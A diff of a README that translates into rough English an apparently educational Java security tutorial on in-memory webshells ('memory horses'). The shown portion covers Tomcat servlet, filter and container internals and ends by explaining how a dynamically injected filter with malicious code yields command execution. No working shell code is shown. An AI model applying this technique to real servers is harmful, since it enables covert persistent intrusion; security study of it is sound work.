@@ -1,134 +1,138 @@
 ![LearnJavaMemshellFromZero](https://socialify.git.ci/W01fh4cker/LearnJavaMemshellFromZero/image?description=1&descriptionEditable=%E3%80%90%E5%8E%9F%E5%88%9B%E3%80%91%E5%AE%8C%E5%85%A8%E9%9B%B6%E5%9F%BA%E7%A1%80%E4%BB%8E0%E5%88%B01%E6%8E%8C%E6%8F%A1Java%E5%86%85%E5%AD%98%E9%A9%AC&forks=1&issues=1&language=1&logo=https%3A%2F%2Fs2.loli.net%2F2022%2F06%2F25%2FgUAh2V5CiD96y8G.jpg&owner=1&pattern=Brick%20Wall&pulls=1&stargazers=1) 
-本文目录：
-- [一、前言](#一前言)
-- [二、前置知识](#二前置知识)
-  - [2.1 Servlet容器与Engine、Host、Context和Wrapper](#21-servlet容器与enginehostcontext和wrapper)
-  - [2.2 编写一个简单的servlet](#22-编写一个简单的servlet)
-  - [2.3 从代码层面看servlet初始化与装载流程](#23-从代码层面看servlet初始化与装载流程)
-    - [2.3.1 servlet初始化流程分析](#231-servlet初始化流程分析)
-    - [2.3.2 servlet装载流程分析](#232-servlet装载流程分析)
-  - [2.4 Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain](#24-filter容器与filterdefsfilterconfigsfiltermapsfilterchain)
-  - [2.5 编写一个简单的Filter](#25-编写一个简单的filter)
-  - [2.6 从代码层面分析Filter运行的整体流程](#26-从代码层面分析filter运行的整体流程)
-  - [2.7 Listener简单介绍](#27-listener简单介绍)
-  - [2.8 编写一个简单的Listener（ServletRequestListener）](#28-编写一个简单的listenerservletrequestlistener)
-  - [2.9 从代码层面分析Listener运行的整体流程](#29-从代码层面分析listener运行的整体流程)
-  - [2.10 简单的spring项目搭建](#210-简单的spring项目搭建)
-    - [2.10.1 编写一个简单的Spring Controller](#2101-编写一个简单的spring-controller)
-    - [2.10.2 编写一个简单的Spring Interceptor](#2102-编写一个简单的spring-interceptor)
-    - [2.10.3 编写一个简单的Spring WebFlux的Demo（基于Netty）](#2103-编写一个简单的spring-webflux的demo基于netty)
-  - [2.11 Spring MVC介绍](#211-spring-mvc介绍)
-    - [2.11.1 Spring MVC九大组件](#2111-spring-mvc九大组件)
-    - [2.11.2 简单的源码分析](#2112-简单的源码分析)
-      - [2.11.2.1 九大组件的初始化](#21121-九大组件的初始化)
-      - [2.11.2.2 url和Controller的关系的建立](#21122-url和controller的关系的建立)
-      - [2.11.2.3 Spring Interceptor引入与执行流程分析](#21123-spring-interceptor引入与执行流程分析)
-  - [2.12 Spring WebFlux介绍与代码调试分析](#212-spring-webflux介绍与代码调试分析)
-    - [2.12.1 什么是Mono？](#2121-什么是mono)
-    - [2.12.2 什么是Flux？](#2122-什么是flux)
-    - [2.12.3 Spring WebFlux启动过程分析](#2123-spring-webflux启动过程分析)
-    - [2.12.4 Spring WebFlux请求处理过程分析](#2124-spring-webflux请求处理过程分析)
-    - [2.12.5 Spring WebFlux过滤器WebFilter运行过程分析](#2125-spring-webflux过滤器webfilter运行过程分析)
-  - [2.13 Tomcat Valve介绍与运行过程分析](#213-tomcat-valve介绍与运行过程分析)
-    - [2.13.1 Valve与Pipeline](#2131-valve与pipeline)
-    - [2.13.2 编写一个简单Tomcat Valve的demo](#2132-编写一个简单tomcat-valve的demo)
-    - [2.13.3 Tomcat Valve打入内存马思路分析](#2133-tomcat-valve打入内存马思路分析)
-  - [2.14 Tomcat Upgrade介绍与打入内存马思路分析](#214-tomcat-upgrade介绍与打入内存马思路分析)
-    - [2.14.1 编写一个简单的Tomcat Upgrade的demo](#2141-编写一个简单的tomcat-upgrade的demo)
-      - [2.14.1.1 利用SpringBoot搭建](#21411-利用springboot搭建)
-      - [2.14.1.2 利用Tomcat搭建](#21412-利用tomcat搭建)
-    - [2.14.2 Tomcat Upgrade内存马介绍与相关代码调试分析](#2142-tomcat-upgrade内存马介绍与相关代码调试分析)
-  - [2.15 Tomcat Executor内存马介绍与打入内存马思路分析](#215-tomcat-executor内存马介绍与打入内存马思路分析)
+Contents of this article:
+- [1. Preface](#1-preface)
+- [2. Pre-knowledge](#2-pre-knowledge)
+  - [2.1 Servlet containers with Engine, Host, Context and Wrapper](#21-servlet-containers-with-engine-host-context-and-wrapper)
+  - [2.2 Write a simple servlet](#22-write-a-simple-servlet)
+  - [2.3 From the code level, servlet initialization and loading process](#23-from-the-code-level-servlet-initialization-and-loading-process)
+    - [2.3.1 Analysis of servlet initialization process](#231-analysis-of-servlet-initialization-process)
+    - [2.3.2 servlet loading process analysis](#232-servlet-loading-process-analysis)
+  - [2.4 Filter containers and FilterDefs、FilterConfigs、FilterMaps、FilterChain](#24-filter-containers-and-filterdefsfilterconfigsfiltermapsfilterchain)
+  - [2.5 Write a simple Filter](#25-write-a-simple-filter)
+  - [2.6 Analyze the overall process of Filter operation from the code level](#26-analyze-the-overall-process-of-filter-operation-from-the-code-level)
+  - [2.7 Listener brief introduction](#27-listener-brief-introduction)
+  - [2.8 Write a simple Listener（ServletRequestListener）](#28-write-a-simple-listener-servletrequestlistener)
+  - [2.9 Analyze the overall process of Listener operation from the code level](#29-analyze-the-overall-process-of-listener-operation-from-the-code-level)
+  - [2.10 Simple spring project construction](#210-simple-spring-project-construction)
+    - [2.10.1 Write a simple Spring Controller](#2101-write-a-simple-spring-controller)
+    - [2.10.2 Write a simple Spring Interceptor](#2102-write-a-simple-spring-interceptor)
+    - [2.10.3 Write a simple Spring WebFlux Demo (based on Netty)](#2103-write-a-simple-spring-webflux-demo-based-on-netty)
+  - [2.11 Spring MVC Introduction](#211-spring-mvc-introduction)
+    - [2.11.1 Spring MVC nine components](#2111-spring-mvc-nine-components)
+    - [2.11.2 Simple source code analysis](#2112-simple-source-code-analysis)
+      - [2.11.2.1 Initialization of nine components](#21121-initialization-of-nine-components)
+      - [2.11.2.2 Establishment of the relationship between url and controller](#21122-establishment-of-the-relationship-between-url-and-controller)
+      - [2.11.2.3 Spring Interceptor introduction and execution process analysis](#21123-spring-interceptor-introduction-and-execution-process-analysis)
+  - [2.12 Introduction to Spring WebFlux and code debugging analysis](#212-introduction-to-spring-webflux-and-code-debugging-analysis)
+    - [2.12.1 What is Mono？](#2121-what-is-mono)
+    - [2.12.2 What is Flux？](#2122-what-is-flux)
+    - [2.12.3 Spring WebFlux startup process analysis](#2123-spring-webflux-startup-process-analysis)
+    - [2.12.4 Analysis of Spring WebFlux request processing process](#2124-analysis-of-spring-webflux-request-processing-process)
+    - [2.12.5 Analysis of the operation process of Spring WebFlux filter WebFilter](#2125-analysis-of-the-operation-process-of-spring-webflux-filter-webfilter)
+  - [2.13 Tomcat Valve introduction and running process analysis](#213-tomcat-valve-introduction-and-running-process-analysis)
+    - [2.13.1 Valves and pipes](#2131-valves-and-pipes)
+    - [2.13.2 Write a simple demo of Tomcat Valve](#2132-write-a-simple-demo-of-tomcat-valve)
+    - [2.13.3 Analysis of Tomcat Valve's idea of ​​entering memory horse](#2133-analysis-of-tomcat-valves-idea-of-entering-memory-horse)
+  - [2.14 Tomcat Upgrade introduction and analysis of the idea of ​​injecting into memory horses](#214-tomcat-upgrade-introduction-and-analysis-of-the-idea-of-injecting-into-memory-horses)
+    - [2.14.1 Write a simple Tomcat Upgrade demo](#2141-write-a-simple-tomcat-upgrade-demo)
+      - [2.14.1.1 Build with SpringBoot](#21411-build-with-springboot)
+      - [2.14.1.2 Built with Tomcat](#21412-built-with-tomcat)
+    - [2.14.2 Tomcat Upgrade memory horse introduction and related code debugging analysis](#2142-tomcat-upgrade-memory-horse-introduction-and-related-code-debugging-analysis)
+  - [2.15 Introduction to Tomcat Executor Memory Horse and Analysis of Ideas for Input Memory Horse](#215-introduction-to-tomcat-executor-memory-horse-and-analysis-of-ideas-for-input-memory-horse)
     - [2.15.1](#2151)
-    - [2.15.2 Tomcat Executor内存马介绍与代码调试分析](#2152-tomcat-executor内存马介绍与代码调试分析)
-      - [2.15.2.1 Endpoint五大组件](#21521-endpoint五大组件)
-      - [2.15.2.2 Endpoint分类](#21522-endpoint分类)
-      - [2.15.2.3 Executor相关代码分析](#21523-executor相关代码分析)
-- [三、传统Web型内存马](#三传统web型内存马)
-  - [3.1 Servlet内存马](#31-servlet内存马)
-    - [3.1.1 简单的servlet内存马demo编写](#311-简单的servlet内存马demo编写)
-    - [3.1.2 servlet内存马demo代码分析](#312-servlet内存马demo代码分析)
-    - [3.1.3 关于StandardContext、ApplicationContext、ServletContext的理解](#313-关于standardcontextapplicationcontextservletcontext的理解)
-  - [3.2 Filter内存马](#32-filter内存马)
-    - [3.2.1 简单的filter内存马demo编写](#321-简单的filter内存马demo编写)
-    - [3.2.2 servlet内存马demo代码分析](#322-servlet内存马demo代码分析)
-    - [3.2.3 tomcat6下filter内存马的编写](#323-tomcat6下filter内存马的编写)
-  - [3.3 Listener内存马](#33-listener内存马)
-    - [3.3.1 简单的Listener内存马demo编写](#331-简单的listener内存马demo编写)
-    - [3.3.2 Listener内存马demo代码分析](#332-listener内存马demo代码分析)
-- [四、Spring MVC框架型内存马](#四spring-mvc框架型内存马)
-  - [4.1 Spring Controller型内存马](#41-spring-controller型内存马)
-    - [4.1.1 简单的Spring Controller型内存马demo编写](#411-简单的spring-controller型内存马demo编写)
-    - [4.1.2 Spring Controller型内存马demo代码分析](#412-spring-controller型内存马demo代码分析)
-  - [4.2 Spring Interceptor型内存马](#42-spring-interceptor型内存马)
-  - [4.3 Spring WebFlux内存马](#43-spring-webflux内存马)
-    - [4.3.1 简单的Spring WebFlux内存马demo编写](#431-简单的spring-webflux内存马demo编写)
-    - [4.3.2 Spring WebFlux内存马demo代码分析](#432-spring-webflux内存马demo代码分析)
-- [五、中间件型内存马](#五中间件型内存马)
-  - [5.1 Tomcat Valve型内存马](#51-tomcat-valve型内存马)
-  - [5.2 Tomcat Upgrade内存马](#52-tomcat-upgrade内存马)
-  - [5.3 Tomcat Executor内存马](#53-tomcat-executor内存马)
-- [六、致谢](#六致谢)
+    - [2.15.2 Tomcat Executor memory horse introduction and code debugging analysis](#2152-tomcat-executor-memory-horse-introduction-and-code-debugging-analysis)
+      - [2.15.2.1 Endpoint's five components](#21521-endpoints-five-components)
+      - [2.15.2.2 Endpoint Classification](#21522-endpoint-classification)
+      - [2.15.2.3 Executor related code analysis](#21523-executor-related-code-analysis)
+- [3. Traditional web-type memory horse](#3-traditional-web-type-memory-horse)
+  - [3.1 Servlet memory horse](#31-servlet-memory-horse)
+    - [3.1.1 Simple servlet memory horse demo writing](#311-simple-servlet-memory-horse-demo-writing)
+    - [3.1.2 servlet memory horse demo code analysis](#312-servlet-memory-horse-demo-code-analysis)
+    - [3.1.3 Understanding of StandardContext, ApplicationContext, ServletContext](#313-understanding-of-standardcontext-applicationcontext-servletcontext)
+  - [3.2 Filter memory horse](#32-filter-memory-horse)
+    - [3.2.1 Simple filter memory horse demo writing](#321-simple-filter-memory-horse-demo-writing)
+    - [3.2.2 servlet memory horse demo code analysis](#322-servlet-memory-horse-demo-code-analysis)
+    - [3.2.3 Writing of filter memory horse under tomcat6](#323-writing-of-filter-memory-horse-under-tomcat6)
+  - [3.3 Listener memory horse](#33-listener-memory-horse)
+    - [3.3.1 Simple Listener memory horse demo written](#331-simple-listener-memory-horse-demo-written)
+    - [3.3.2 Listener memory horse demo code analysis](#332-listener-memory-horse-demo-code-analysis)
+- [4. Spring MVC frame-type memory horse](#4-spring-mvc-frame-type-memory-horse)
+  - [4.1 Spring Controller memory horse](#41-spring-controller-memory-horse)
+    - [4.1.1 Simple Spring Controller type memory horse demo writing](#411-simple-spring-controller-type-memory-horse-demo-writing)
+    - [4.1.2 Spring Controller memory horse demo code analysis](#412-spring-controller-memory-horse-demo-code-analysis)
+  - [4.2 Spring Interceptor type memory horse](#42-spring-interceptor-type-memory-horse)
+  - [4.3 Spring WebFlux Memory Horse](#43-spring-webflux-memory-horse)
+    - [4.3.1 Simple Spring WebFlux memory horse demo written](#431-simple-spring-webflux-memory-horse-demo-written)
+    - [4.3.2 Spring WebFlux memory horse demo code analysis](#432-spring-webflux-memory-horse-demo-code-analysis)
+- [5. Middleware memory horse](#5-middleware-memory-horse)
+  - [5.1 Tomcat Valve type memory horse](#51-tomcat-valve-type-memory-horse)
+  - [5.2 Tomcat Upgrade Memory Horse](#52-tomcat-upgrade-memory-horse)
+  - [5.3 Tomcat Executor Memory Horse](#53-tomcat-executor-memory-horse)
+- [6. Thanks](#6-thanks)
 
-# 一、前言
+# 1. Preface
 
-&ensp;&ensp;&ensp;&ensp;之前写的零基础学`Fastjson`的文章反响很不错，很多师傅在公众号后台和我的微信私聊我表示感谢，其实也没啥，大家都是零基础过来的。网上的文章多而杂，并且只有少部分文章是配图清楚、文字描述清晰的，很多时候新手学着学着可能就因为作者的某一个地方没有描述清楚而不知其所指，非常痛苦；亦或是文章面向对象不同，前置知识不扎实导致很多东西无法理解，这些痛点我都曾经历过。但是随着看过的代码逐渐增多，见识逐渐丰富，调试的次数越多，对各种问题的处理就会越得心应手。  
-&ensp;&ensp;&ensp;&ensp;本文所讨论的`Java`内存马是`Java`安全中的一个不可或缺的板块，它内容丰富绮丽，研究起来让人着迷，沉沦其中流连忘返。我参考了`su18`师傅一年多以前发表在`Goby`社区的这篇文章（`https://nosec.org/home/detail/5049.html`）中给出的分类方式，把整个零基础掌握`java`内存马系列分成了以下几个部分：传统`web`型、`spring`系列框架型、中间件型、其他内存马（`Websocket/Jsp/线程型/RMI`）、`Agent`型内存马、实战内存马打入（`Jetty`/`Weblogic`/`Shiro`/`Struts2`/`GlassFish`/`xxl-job`...）和内存马。  
-&ensp;&ensp;&ensp;&ensp;好了，让我们闲话少叙，就此开始。
+&ensp;&ensp;&ensp;&ensp;The article about zero-based learning I wrote before `Fastjson` received a very good response. Many masters chatted with me on WeChat in the background of the official account to express their gratitude. In fact, it’s nothing, everyone started from scratch. There are many articles on the Internet, and only a few articles have clear pictures and clear text descriptions. Many times, novices may not know what the author means because he does not describe a certain place clearly, which is very painful; or the articles are different in object orientation, and the pre-knowledge is not solid, which makes many things incomprehensible. I have experienced these pain points. However, as I read more and more codes, my knowledge gradually becomes richer, and the more times I debug, the more handy I will be in dealing with various problems. The memory horse   
+&ensp;&ensp;&ensp;&ensp;The `Java` memory horse discussed in this article is an indispensable part of `Java` security. It has rich and beautiful content, and it is fascinating to study it, and it is intoxicated by lingering in it. I refer to the classification method given by Master `Su18` more than a year ago in this article published in the `Goby` community (`https://nosec.org/home/detail/5049.html`)，The entire `java` memory horse series is divided into the following parts: traditional `web` type、`spring` series frame type, middleware type, other memory horses (`Websocket/Jsp/thread type/RMI`)、`Agent` type memory horse, practical memory horse input (`Jetty`/`Weblogic`/`Shiro`/`Struts2`/`GlassFish`/`xxl-job`...) and memory horse.  
+&ensp;&ensp;&ensp;&ensp;OK, let's talk less and start here.
 
-# 二、前置知识
+# 2. Pre-knowledge
 
-本篇文章除特殊说明外，使用的是`jdk1.8.0_202`+ `tomcat 9.0.85`，后者下载地址为：
+Except for special instructions in this article，`jdk1.8.0_202`+ `tomcat 9.0.85` is used, and the latter download address is:
 > https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.85/bin/apache-tomcat-9.0.85-windows-x64.zip
 
-## 2.1 Servlet容器与Engine、Host、Context和Wrapper
+[tomcat-9.0.85-windows-x64.zip](Files/tomcat-9.0.85-windows-x64.zip)
 
-这部分我找了好久，终于在一大堆高深/垃圾的文章中邂逅了一篇写的还算简明扼要易于理解的文章。
+[jdk-8u202-windớ-x64.exe](Files/jdk-8u202-windows-x64.exe)
 
->  原文地址：https://www.maishuren.top/archives/tomcat-zhong-servlet-rong-qi-de-she-ji-yuan-li
+## 2.1 Servlet containers with Engine, Host, Context and Wrapper
 
-这里组合引用其原文，简单概括，就是：
+I searched for this part for a long time, and finally encountered a pretty concise and easy-to-understand article in a lot of profound/trash articles.
 
-`Tomcat`设计了四种容器，分别是`Engine`、`Host`、`Context`和`Wrapper`，其关系如下：
-![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/20240112165508.png)
+> Original address: https://pankas.top/2023/11/08/java%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%94%E8%AE%B0/
 
-这一点可以从`Tomcat`的配置文件`server.xml`中看出来。
+Here, the original text is quoted, and it is briefly summarized:
 
-此时，设想这样一个场景：我们此时要访问`https://manage.xxx.com:8080/user/list`，那`tomcat`是如何实现请求定位到具体的`servlet`的呢？为此`tomcat`设计了`Mapper`，其中保存了容器组件与访问路径的映射关系。
+`Tomcat` designed four types of containers, namely `Engine`, `Host`, `Context` and `Wrapper`, the relationship is as follows:
+![](Images/20240112165508.png)
 
-然后就开始四步走：
+This can be seen from the configuration file `server.xml` of `Tomcat`.
 
-1. 根据协议和端口号选定`Service`和`Engine`。
+At this time, imagine a scenario: We want to visit `https://manage.xxx.com:8080/user/list` at this time, how does `tomcat` implement request positioning to a specific `servlet`? For this `tomcat`, a `Mapper` was designed, which preserves the mapping relationship between the container component and the access path.
 
-   我们知道`Tomcat`的每个连接器都监听不同的端口，比如`Tomcat`默认的`HTTP`连接器监听`8080`端口、默认的`AJP`连接器监听`8009`端口。上面例子中的URL访问的是`8080`端口，因此这个请求会被`HTTP`连接器接收，而一个连接器是属于一个`Service`组件的，这样`Service`组件就确定了。我们还知道一个`Service`组件里除了有多个连接器，还有一个容器组件，具体来说就是一个`Engine`容器，因此`Service`确定了也就意味着`Engine`也确定了。
+Then start four steps:
 
-2. 根据域名选定`Host`。
+1. Select `Service` and `Engine` according to the protocol and port number.
 
-   `Service`和`Engine`确定后，`Mapper`组件通过`url`中的域名去查找相应的`Host`容器，比如例子中的`url`访问的域名是`manage.xxx.com`，因此`Mapper`会找到`Host1`这个容器。
+   We know that each connector of Tomcat listens to different ports, such as the default HTTP connector listens to port 8080 and the default AJP connector listens to port 8009. The URL in the example above accesses port 8080, so this request will be received by the HTTP connector, and a connector belongs to a Service component, so the Service component is determined. We also know that in addition to multiple connectors, a `Service` component also has a container component, specifically an `Engine` container. Therefore, if the `Service` is determined, it means that the `Engine` is also confirmed.
 
-3. 根据`url`路径找到`Context`组件。
+2. Select `Host` according to the domain name.
 
-   `Host`确定以后，`Mapper`根据`url`的路径来匹配相应的`Web`应用的路径，比如例子中访问的是`/user`，因此找到了`Context1`这个`Context`容器。
+   After the `Service` and `Engine` are determined, the `Mapper` component searches for the corresponding `Host` container through the domain name in `url`. For example, the domain name accessed by `url` in the example is `manage.xxx.com`, so the `Mapper` will find the `Host1` container.
 
-4. 根据`url`路径找到`Wrapper`（`Servlet`）。
+3. Find the `Context` component according to the `url` path.
 
-   `Context`确定后，`Mapper`再根据`web.xml`中配置的`Servlet`映射路径来找到具体的`Wrapper`和`Servlet`，例如这里的`Wrapper1`的`/list`。
+   After the `Host` is determined, the `Mapper` matches the path of the corresponding `Web` application according to the path of `url`. For example, in the example, the `/user` is accessed, so the `Context1` container is found.
+
+4. Find `Wrapper`(`Servlet`) according to the `url` path.
+
+   After the `Context` is determined, the `Mapper` then finds the specific `Wrapper` and `Servlet` based on the `Servlet` map path configured in `web.xml`, such as the `/list` of `Wrapper1` here.
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/20240112165824.png)
 
-这里的`Context`翻译过来就是上下文，它包括`servlet`运行的基本环境；这里的`Wrapper`翻译过来就是包装器，它负责管理一个`servlet`，包括其装载、初始化、执行和资源回收。
+The `Context` here is translated as a context, which includes the basic environment for the `servlet` to run; the `Wrapper` here is translated as a wrapper, which is responsible for managing a `servlet`, including its loading, initialization, execution and resource recycling.
 
-关于上图中的连接器的设计，可以继续参考该作者的博文：
+Regarding the design of the connector in the picture above, you can continue to refer to the author's blog post:
 
 > https://www.maishuren.top/archives/yi-bu-bu-dai-ni-le-jie-tomcat-zhong-de-lian-jie-qi-shi-ru-he-she-ji-de
 
-写到后面之后我又发现了一篇写的极佳的文章，贴在这儿供大家参考，讲的是关于`tomcat`架构的原理解析：
+After writing it, I found another excellent article, which is posted here for your reference. It is about the principle analysis of the `tomcat` architecture:
 
 > https://blog.nowcoder.net/n/0c4b545949344aa0b313f22df9ac2c09
 
-## 2.2 编写一个简单的servlet
+## 2.2 Write a simple servlet
 
-`pom.xml`文件如下：
+The `pom.xml` file is as follows:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -158,10 +162,10 @@
 </project>
 ```
 
-同步下依赖：
+Synchronize dependencies:
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174417723.png)
 
-`TestServlet.java`代码如下：
+The `TestServlet.java` code is as follows:
 
 ```java
 package org.example;
@@ -180,7 +184,7 @@ public class TestServlet extends HttpServlet {
 }
 ```
 
-然后配置项目运行所需的`tomcat`环境：
+Then configure the `tomcat` environment required for the project to run:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174451460.png)
 
@@ -188,7 +192,7 @@ public class TestServlet extends HttpServlet {
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174543728.png)
 
-然后配置`artifacts`，直接点击`fix`：
+Then configure `artifacts` and click `fix` directly:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174604960.png)
 
@@ -198,7 +202,7 @@ public class TestServlet extends HttpServlet {
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112174840311.png)
 
-然后添加`web`模块：
+Then add the `web` module:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112175314298.png)
 
@@ -206,21 +210,21 @@ public class TestServlet extends HttpServlet {
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112181600664.png)
 
-运行之后，访问http://localhost:8080/testServlet/test：
+After running, visit http://localhost:8080/testServlet/test:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240112181649265.png)
 
-## 2.3 从代码层面看servlet初始化与装载流程
+## 2.3 From the code level, servlet initialization and loading process
 
-主要参考文章：
+Main reference articles:
 
 > https://longlone.top/安全/java/java安全/内存马/Tomcat-Servlet型/
 
-我们这里不采用我们下载的`tomcat`来运行我们的项目，我们使用嵌入式`tomcat`也就是所谓的`tomcat-embed-core`。关于动态调试，我是图省事，直接用`tomcat-embed-core`，你当然也可以调试直接调试`tomcat`源码，环境搭建方法可以参考`Skay`师傅的文章：
+We do not use the `tomcat` we downloaded to run our project here, we use the embedded `tomcat`, which is called `tomcat-embed-core`. Regarding dynamic debugging, I want to save trouble and use `tomcat-embed-core` directly. Of course, you can also debug and directly debug the `tomcat` source code. For the environment construction method, please refer to the article of Master Skay:
 
 > https://mp.weixin.qq.com/s/DMVcqtiNG9gMdrBUyCRCgw
 
-我们重开一个项目，文件代码如下：
+We reopen a project, and the file code is as follows:
 
 `pom.xml`：
 
@@ -307,23 +311,23 @@ public class HelloServlet extends HttpServlet {
 }
 ```
 
-### 2.3.1 servlet初始化流程分析
+### 2.3.1 Analysis of servlet initialization process
 
-我们在`org.apache.catalina.core.StandardWrapper#setServletClass`处下断点调试：
+We debug at `org.apache.catalina.core.StandardWrapper#setServletClass`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115162053776.png)
 
-我们尝试按`Ctrl+左键`追踪它的上层调用位置，但是提示我们找不到，需要按两次`Ctrl+Alt+F7`：
+We tried to press `Ctrl+left key` to track its upper call location, but it was prompted that we could not find it, so we need to press `Ctrl+Alt+F7` twice:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115162215565.png)
 
-然后就可以看到，上层调用位置位于`org.apache.catalina.startup.ContextConfig#configureContext`：
+Then you can see that the upper call location is located at `org.apache.catalina.startup.ContextConfig#configureContext`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115162319884.png)
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115162405771.png)
 
-接下来我们详细看下面这段代码：
+Next, let's look at the following code in detail:
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115184354717.png)
 
 ```java
@@ -382,30 +386,30 @@ for (ServletDef servlet : webxml.getServlets().values()) {
         }
 ```
 
-首先通过`webxml.getServlets()`获取的所有`Servlet`定义，并建立循环；然后创建一个`Wrapper`对象，并设置`Servlet`的加载顺序、是否启用（即获取`</load-on-startup>`标签的值）、`Servlet`的名称等基本属性；接着遍历`Servlet`的初始化参数并设置到`Wrapper`中，并处理安全角色引用、将角色和对应链接添加到`Wrapper`中；如果`Servlet`定义中包含文件上传配置，则根据配置信息设置`MultipartConfigElement`；设置`Servlet`是否支持异步操作；通过`context.addChild(wrapper);`将配置好的`Wrapper`添加到`Context`中，完成`Servlet`的初始化过程。
+First, all Servlet definitions obtained through `webxml.getServlets()` and create a loop; then create a `Wrapper` object, and set the loading order of `Servlet`, whether it is enabled (that is, get the value of the `</load-on-startup>` tag), the name of `Servlet`; then iterate over the initialization parameters of `Servlet` and set it to `Wrapper`, and handle the security role Reference, add roles and corresponding links to `Wrapper`; if the `Servlet` definition contains file upload configuration, set `MultipartConfigElement` according to the configuration information; set whether `Servlet` supports asynchronous operations; add the configured `Context.addChild(wrapper);` to `Context` to complete the initialization process of `Servlet`.
 
-上面大的`for`循环中嵌套的最后一个`for`循环则负责处理`Servlet`的`url`映射，将`Servlet`的`url`与`Servlet`名称关联起来。
+The last `for` loop nested in the large `for` loop above is responsible for processing the `url` mapping of `Servlet`, associating the `url` of `Servlet` with the `Servlet` name.
 
-也就是说，`Servlet`的初始化主要经历以下六个步骤：
+In other words, the initialization of `Servlet` mainly goes through the following six steps:
 
-- 创建`Wapper`对象；
-- 设置`Servlet`的`LoadOnStartUp`的值；
-- 设置`Servlet`的名称；
-- 设置`Servlet`的`class`；
-- 将配置好的`Wrapper`添加到`Context`中；
-- 将`url`和`servlet`类做映射
+- Create a `Wapper` object;
+- Set the value of `LoadOnStartUp` of `Servlet`;
+- Set the name of `Servlet`;
+- Set the `class` of `Servlet`;
+- Add the configured `Wrapper` to the `Context`;
+- Map `url` and `servlet` classes
 
-### 2.3.2 servlet装载流程分析
+### 2.3.2 servlet loading process analysis
 
-我们在`org.apache.catalina.core.StandardWrapper#loadServlet`这里打下断点进行调试，重点关注`org.apache.catalina.core.StandardContext#startInternal`：
+We set a breakpoint here in `org.apache.catalina.core.StandardWrapper#loadServlet` for debugging, focusing on `org.apache.catalina.core.StandardContext#startInternal`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115193750678.png)
 
-可以看到，装载顺序为`Listener`-->`Filter`-->`Servlet`：
+As you can see, the loading order is `Listener`-->`Filter`-->`Servlet`:
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/image-20240115194704999.png)
 
-可以看到，上面红框中的代码都调用了`org.apache.catalina.core.StandardContext#loadOnStartup`，`Ctrl+左键`跟进该方法，代码如下：
+You can see that the code in the red box above calls `org.apache.catalina.core.StandardContext#loadOnStartup`, and `Ctrl+left key` follows up with the method. The code is as follows:
 ```java
 public boolean loadOnStartup(Container children[]) {
     TreeMap<Integer,ArrayList<Wrapper>> map = new TreeMap<>();
@@ -436,23 +440,23 @@ public boolean loadOnStartup(Container children[]) {
 }
 ```
 
-可以看到，这段代码先是创建一个`TreeMap`，然后遍历传入的`Container`数组，将每个`Servlet`的`loadOnStartup`值作为键，将对应的`Wrapper`对象存储在相应的列表中；如果这个`loadOnStartup`值是负数，除非你请求访问它，否则就不会加载；如果是非负数，那么就按照这个`loadOnStartup`的升序的顺序来加载。
+As you can see, this code first creates a `TreeMap`, then iterates over the incoming `Container` array, takes the loadOnStartup value of each `Servlet` as a key, and stores the corresponding `Wrapper` object in the corresponding list; if the `loadOnStartup` value is a negative number, it will not be loaded unless you request access to it; if it is a non-negative number, then load it in the ascending order of this `loadOnStartup`.
 
-## 2.4 Filter容器与FilterDefs、FilterConfigs、FilterMaps、FilterChain
+## 2.4 Filter containers and FilterDefs、FilterConfigs、FilterMaps、FilterChain
 
-开头先明确一点，就是`Filter`容器是用于对请求和响应进行过滤和处理的，以下这张图是根据`Skay`师傅文章中的图片重制的：
+To be clear at the beginning, the `Filter` container is used to filter and process requests and responses. The following picture is remade based on the picture in the `Skay` master's article:
 
 > https://mp.weixin.qq.com/s/eI-50-_W89eN8tsKi-5j4g
 
 ![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image/filter-demo.png)
 
-从上图可以看出，这个`filter`就是一个关卡，客户端的请求在经过`filter`之后才会到`Servlet`，那么如果我们动态创建一个`filter`并且将其放在最前面，我们的`filter`就会最先执行，当我们在`filter`中添加恶意代码，就可以实现命令执行，形成内存马。
+As can be seen from the above figure, this `filter` is a level. The client's request will only reach the `Servlet` after passing the `filter`. Then if we dynamically create a `filter` and put it in the front, our `filter` will be executed first. When we add malicious code to the `filter`, we can implement command execution and form a memory horse.
 
